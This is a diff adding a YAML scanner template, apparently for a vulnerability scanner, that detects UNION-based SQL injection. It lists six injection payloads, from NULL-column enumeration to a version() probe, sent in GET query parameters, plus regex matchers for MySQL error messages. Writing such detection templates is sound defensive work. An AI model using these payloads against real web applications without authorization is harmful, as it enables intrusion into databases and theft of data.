@@ -1,0 +1,39 @@
+id: sqli-union-based
+name: SQL Injection (UNION-Based)
+severity: critical
+vulnerability_type: sqli
+owasp: "A03:2021 Injection"
+cwe: CWE-89
+description: Detects UNION-based SQL injection via column enumeration errors
+tags: [sqli, union, injection]
+
+payloads:
+  - "1 UNION SELECT NULL--"
+  - "1 UNION SELECT NULL,NULL--"
+  - "1 UNION SELECT NULL,NULL,NULL--"
+  - "1' UNION SELECT NULL,NULL,NULL--"
+  - "1' AND 1=2 UNION SELECT 1,2,3--"
+  - "' UNION SELECT version(),2,3--"
+
+request:
+  method: GET
+  inject_in: query
+
+matchers:
+  - type: regex
+    value: "The used SELECT statements have a different number of columns"
+    part: body
+  - type: regex
+    value: "You have an error in your SQL syntax"
+    part: body
+  - type: regex
+    value: "UNION.*SELECT"
+    part: body
+  - type: regex
+    value: "Warning.*mysqli?"
+    part: body
+  - type: regex
+    value: "mysql_fetch|mysql_num_rows"
+    part: body
+
+match_condition: or
